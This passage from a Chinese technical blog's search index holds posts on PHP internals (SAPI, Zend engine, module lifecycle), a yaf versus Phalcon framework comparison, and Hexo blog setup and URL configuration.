class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>demo改动不大，主要是参数引用问题，其他改动的没有参数就添加参数</p><ul><li>后续支付宝遇到问题<br>1.回调不及时，采用订单查询<br>2.回调http返回0，排查是公司的DNS问题，回调地址换成IP就可以了</li></ul>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 微信 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP底层工作原理</title>
      <link href="/PHP%E5%BA%95%E5%B1%82%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.html"/>
      <url>/PHP%E5%BA%95%E5%B1%82%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.html</url>
      <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul><li>php相关进程是随着Apache的启动而运行的；PHP通过mod_php5.so模块和Apache相连(具体说来是SAPI，即服务器应用程序编程接口)</li><li>PHP总共有三个模块：内核、Zend引擎、以及扩展层；PHP内核用来处理请求、文件流、错误处理等相关操作</li><li>Zend引擎（ZE）用以将源文件转换成机器语言，然后在虚拟机上运行它</li><li>扩展层是一组函数、类库和流，PHP使用它们来执行一些特定的操作(比如，我们需要mysql扩展来连接MySQL数据库)</li><li>当ZE执行程序时可能会需要连接若干扩展，这时ZE将控制权交给扩展，等处理完特定任务后再返还</li><li>最后，ZE将程序运行结果返回给PHP内核，它再将结果传送给SAPI层，最终输出到浏览器上</li></ul><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li>PHP启动第一步—-&gt;[模块初始化(扩展)]<br>启动Apache后，PHP解释程序也随之启动；<br>PHP调用各个扩展的MINIT方法，从而使这些扩展切换到可用状态。看看php.ini文件里打开了哪些扩展吧；<br>MINIT的意思是“模块初始化”。各个模块都定义了一组函数、类库等用以处理其他请求。</li><li><p>PHP启动第二步—-&gt;[请求初始化(变量)]<br>当一个页面请求发生时，SAPI层将控制权交给PHP层。于是PHP设置了用于回复本次请求所需的环境变量。<br>同时，它还建立一个变量表，用来存放执行过程中产生的变量名和值<br>PHP调用各个模块的RINIT方法，即“请求初始化”。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一个经典的例子是Session模块的RINIT，如果在php.ini中启用了Session模块，那在调用该模块的RINIT时就会初始化<span class="variable">$_SESSION</span>变量，并将相关内容读入；RINIT方法可以看作是一个准备过程，在程序执行之间就会自动启动。</span><br><span class="line">一个典型的RINIT方法如下：</span><br><span class="line">PHP_RINIT_FUNCTION(extension_name) &#123;</span><br><span class="line">/* Initialize session variables, pre-populate variables, redefine global variables etc */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>PHP关闭第一步—&gt;[变量销毁]<br>一旦页面执行完毕（无论是执行到了文件末尾还是用exit或die函数中止），PHP就会启动清理程序。<br>它会按顺序调用各个模块的RSHUTDOWN方法。RSHUTDOWN用以清除程序运行时产生的符号表，也就是对每个变量调用unset函数。</p></li><li>PHP关闭第二步—&gt;[扩展释放]<br>PHP调用每个扩展的MSHUTDOWN方法，这是各个模块最后一次释放内存的机会</li></ol><h3 id="Zend引擎"><a href="#Zend引擎" class="headerlink" title="Zend引擎"></a>Zend引擎</h3><p>Zend整体用纯c实现，是php的内核部分，它将php代码翻译（词法、语法解析等一系列编译过程）为可执行opcode的处理并实现相应的处理方法、实现了基本的数据结构（如hashtable、oo）、内存分配及管理、提供了相应的api方法供外部调用，是一切的核心，所有的外围功能均围绕zend实现。</p><h3 id="Extensions"><a href="#Extensions" class="headerlink" title="Extensions"></a>Extensions</h3><p>围绕着zend引擎，extensions通过组件式的方式提供各种基础服务，我们常见的各种内置函数（如array系列）、标准库等都是通过extension来实现，用户也可以根据需要实现自己的extension以达到功能扩展、性能优化等目的（如贴吧正在使用的php中间层、富文本解析就是extension的典型应用）。</p><h3 id="Sapi"><a href="#Sapi" class="headerlink" title="Sapi"></a>Sapi</h3><p>Sapi全称是Server Application Programming Interface，也就是服务端应用编程接口，sapi通过一系列钩子函数，使得php可以和外围交互数据，这是php非常优雅和成功的一个设计，通过sapi成功的将php本身和上层应用解耦隔离，php可以不再考虑如何针对不同应用进行兼容，而应用本身也可以针对自己的特点实现不同的处理方式<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Unix/Linux环境下：</span><br><span class="line">LoadModule php5_module modules/mod_php5.so</span><br><span class="line">AddType application/x-httpd-php .php</span><br><span class="line">注：其中modules/mod_php5.so 是X系统环境下mod_php5.so文件的安装位置。</span><br><span class="line">Windows环境下：</span><br><span class="line">LoadModule php5_module d:/php/php5apache2.dll</span><br><span class="line">AddType application/x-httpd-php .php</span><br><span class="line">注：其中d:/php/php5apache2.dll 是在Windows环境下php5apache2.dll文件的安装位置。</span><br><span class="line">这两项配置就是告诉Apache Server，以后收到的Url用户请求，凡是以php作为后缀，就需要调用php5_module模块（mod_php5.so/ php5apache2.dll）进行处理。</span><br></pre></td></tr></table></figure></p><h3 id="上层应用"><a href="#上层应用" class="headerlink" title="上层应用"></a>上层应用</h3><p>这就是我们平时编写的php程序，通过不同的sapi方式得到各种各样的应用模式，如通过webserver实现web应用、在命令行下以脚本方式运行等等。</p>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>框架比较</title>
      <link href="/php%E6%A1%86%E6%9E%B6.html"/>
      <url>/php%E6%A1%86%E6%9E%B6.html</url>
      <content type="html"><![CDATA[<h3 id="yaf"><a href="#yaf" class="headerlink" title="yaf"></a>yaf</h3><p>yaf为何快</p><blockquote><ol><li>用C语言开发的PHP框架, 相比原生的PHP, 几乎不会带来额外的性能开销.</li><li>所有的框架类, 不需要编译, 在PHP启动的时候加载, 并常驻内存.</li><li>更短的内存周转周期, 提高内存利用率, 降低内存占用率.</li><li>灵巧的自动加载. 支持全局和局部两种加载规则, 方便类库共享.</li><li>高性能的视图引擎.</li><li>高度灵活可扩展的框架, 支持自定义视图引擎, 支持插件, 支持自定义路由等等.</li><li>内建多种路由, 可以兼容目前常见的各种路由协议.</li><li>强大而又高度灵活的配置文件支持. 并支持缓存配置文件, 避免复杂的配置结构带来的性能损失.</li><li>在框架本身,对危险的操作习惯做了禁止.</li><li>更快的执行速度, 更少的内存占用.</li></ol></blockquote><h3 id="phalcon"><a href="#phalcon" class="headerlink" title="phalcon"></a>phalcon</h3><blockquote><ol><li>Zephir/C 扩展的加载与 PHP web 服务器守护进程启动进程一次</li><li>所有的框架类, 不需要编译, 在PHP启动的时候加载, 并常驻内存.</li><li>内建多种路由, 可以兼容目前常见的各种路由协议.</li></ol></blockquote><p>​    Phalcon基于C语言写的ORM，配合PHP-FPM提供的多进程的PHP数据库连接池，将提供性能极为强悍并且健壮的多进程数据库连接池。苦逼的是我大Phalcon文档太烂，根本就没提到这方面的先天优势。根本不需要swoole，nginx与php-fpm的黄金搭档以及phalcon提供的高性能ORM，就能提供目前最好的PHP数据库连接池解决方案。</p><p>​    就是PHP-FPM的配置文件。关于配置文件，PHPer都看得懂，我就不多说了。主要说说PHP-FPM带来的PHP数据库连接池的特色：</p><p><img src="https://github.com/fupengfei058/article-collection/blob/master/doc/e2.png?raw=true" alt=""></p><p>​        </p><ol><li><p>PHP-FPM一个进程对应一个持久化的数据库连接；</p></li><li><p>所有PHP-FPM进程所创造的持久化数据库连接，不能超过mysql的最大数据库连接数的，默认max_connections为150个连接。所以，不管是动态还是静态管理PHP-FPM进程，都需要注意PHP-FPM的进程数和mysql的最大连接数。</p></li><li><p>如果一个PHP请求，请求了多个不同数据库的数据，创建了多个持久化的数据库连接。那么对应的PHP-FPM就会在一个进程内创建多个持久化的数据库连接。这里是一个比较坑的地方，所有PHPer都应该注意。</p><p>假设服务器有100个PHP-FPM的进程，单个请求向5个不同的数据库请求持久化连接的数据，那么服务器将会创建500个持久化的数据库连接。</p></li></ol><p>虽然Phalcon官方文档并没有提及PDO的数据库连接池，但是翻看Phalcon的PDO类的源代码，就会发现Phalcon实际上是支持PDO的数据库连接池</p><p><img src="https://github.com/fupengfei058/article-collection/blob/master/doc/e3.png?raw=true" alt=""></p><p>​    不仅仅支持PHP的数据库连接池，而且他用C语言写的ORM，性能要比所有的PHP语言写的ORM要强很多。也就是说Phalcon的ORM及与PHP-FPM实现的数据库连接池，就是目前PHP所有框架中数据库连接池性能最强的。</p><p>​    yaf框架虽然路由性能比phalcon略好，但是由于没有ORM，在拉取PHP所写的ORM后，其ORM性能要比Phalcon内置的C语言所写的PHQL要差</p>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> yaf </tag>
            
            <tag> Phalcon </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hexo 友好 URL</title>
      <link href="/hexo-url.html"/>
      <url>/hexo-url.html</url>
      <content type="html"><![CDATA[<p>hexo 的正常url是带日期和文件名的 ，这样是非常不友好URL解析和排名的</p><p>下面介绍怎么使文件名中文随意，URL变成英文</p><p>在项目_config.yml中，添加:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">permalink: :urlname.html</span><br></pre></td></tr></table></figure><p>再在每篇文章头加入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urlname: hexo-install</span><br></pre></td></tr></table></figure><p>类似</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">title: 用 hexo 创建 blog</span><br><span class="line">date: 2017-02-18 12:00:00</span><br><span class="line">urlname: hexo-install</span><br><span class="line">tags: <span class="string">"hexo"</span></span><br><span class="line">categories: <span class="string">"技术"</span></span><br></pre></td></tr></table></figure><p>这样就OK了</p>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>用 hexo 创建 blog</title>
      <link href="/hexo-install.html"/>
      <url>/hexo-install.html</url>
      <content type="html"><![CDATA[<h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>hexo 的官方文档 ,<a href="https://hexo.io/zh-cn/docs/index.html" target="_blank" rel="noopener">地址</a></p><p>安装 Hexo 相当简单。然而在安装前，您必须检查电脑中是否已安装下列应用程序：</p><ul><li><a href="http://git-scm.com/" target="_blank" rel="noopener">git</a></li><li><a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a></li></ul><h3 id="Hexo-安装部署"><a href="#Hexo-安装部署" class="headerlink" title="Hexo 安装部署"></a>Hexo 安装部署</h3><ul><li>打开hexo 执行安装命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br><span class="line">$ hexo init blog</span><br><span class="line">$ <span class="built_in">cd</span> blog</span><br><span class="line">$ npm install</span><br><span class="line">$ hexo clean</span><br><span class="line">$ hexo server</span><br><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><ul><li>部署到github上</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><h3 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h3><ul><li>配置文件中“：”后面要带空格,否则报错</li><li>搜索开启本地搜索才会出现搜索框</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">local_search:</span><br><span class="line"><span class="built_in">enable</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure><ul><li>修改空心变实心</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>/css/_common/components/post/post-expand.styl</span><br><span class="line">  ul li &#123; list-style: disc; &#125;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://hexo.io/zh-cn/docs/server.html" target="_blank" rel="noopener">官方文档:</a><a href="https://hexo.io/zh-cn/docs/index.html" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/index.html</a><br><a href="http://blog.aiyouweiya.xyz/posts/3077/" target="_blank" rel="noopener">配置相关:</a></p>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
